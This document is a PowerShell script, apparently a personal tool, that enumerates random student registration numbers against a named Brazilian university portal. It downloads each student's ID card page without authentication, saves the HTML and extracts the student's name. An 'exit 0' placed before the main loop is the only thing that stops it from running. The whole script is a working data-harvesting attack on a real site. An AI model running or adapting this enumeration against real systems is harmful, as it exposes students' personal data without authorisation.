$text= @'

                                                                                                         
                                                        ,-.----.                                         
                                              .--.--.   \    /  \  ,-.----.      ,---,                   
         ,--,       ,---.      ,---.         /  /    '. |   :    \ \    /  \    '  .' \            ,---, 
       ,'_ /|      /__./|     /__./|        |  :  /`. / |   |  .\ :;   :    \  /  ;    '.         /_ ./| 
  .--. |  | : ,---.;  ; |,---.;  ; |        ;  |  |--`  .   :  |: ||   | .\ : :  :       \  ,---, |  ' : 
,'_ /| :  . |/___/ \  | /___/ \  | |        |  :  ;_    |   |   \ :.   : |: | :  |   /\   \/___/ \.  : | 
|  ' | |  . .\   ;  \ ' \   ;  \ ' |         \  \    `. |   : .   /|   |  \ : |  :  ' ;.   :.  \  \ ,' ' 
|  | ' |  | | \   \  \: |\   \  \: |          `----.   \;   | |`-' |   : .  / |  |  ;/  \   \\  ;  `  ,' 
:  | | :  ' ;  ;   \  ' . ;   \  ' .          __ \  \  ||   | ;    ;   | |  \ '  :  | \  \ ,' \  \    '  
|  ; ' |  | '   \   \   '  \   \   '         /  /`--'  /:   ' |    |   | ;\  \|  |  '  '--'    '  \   |  
:  | : ;  ; |    \   `  ;   \   `  ;        '--'.     / :   : :    :   ' | \.'|  :  :           \  ;  ;  
'  :  `--'   \    :   \ |    :   \ |          `--'---'  |   | :    :   : :-'  |  | ,'            :  \  \ 
:  ,      .-./     '---"      '---"                     `---'.|    |   |.'    `--''               \  ' ; 
 `--`----'                                                `---`    `---'                           `--`  
                                                                                                         
                                                        
By joaogmbd
'@
Write-Host -ForegroundColor Red -BackgroundColor Black $text
Write-Host -ForegroundColor Yellow "Cuidado com a quantidade de requisicoes!!!!!!"
$tries = Read-Host "Quantidade de requisicoes: "
$ano = Read-Host "Ano da matricula: "

$test = Test-Path -Path ".\blacklist.txt" -Type Leaf
if ($test -eq $false){
    New-Item -ItemType File -Name "blacklist.txt"
}
$blacklisted = Get-Content -Path "blacklist.txt"
$blacklist = @()
foreach ($i in $blacklisted){
    $blacklist += $i
}
Write-Host "As seguintes matriculas ja foram investigadas:"
write-Host $blacklisted

exit 0
for($e = 0; $e -le $tries;$e++){

    $matricula = Get-Random -Maximum 99999
    $matricula = '{0:d5}' -f $matricula
    $matricula = $ano+$matricula

    $response = Invoke-WebRequest -Uri "https://aluno.uvv.br/ExibirCarteira?login=$matricula&tipo=html&modelo=verso"
    if ($response.RawContentLength -le 0){
        Write-Output "$matricula nao eh uma matricula valida."
        Write-Output "$matricula">> blacklist.txt
        $blacklist += $e
    }
    if ($response.RawContentLength -gt 0){
        Write-Output "$matricula existe!"
        Write-Output $response.content > "$matricula.html"
        Write-Output "$matricula">> blacklist.txt
        $nome = (Get-Content -Path "$matricula.html" | findstr "nome")
        $blacklist += $e
        
        Write-Output "$nome `n foi salvo!"
    }
}
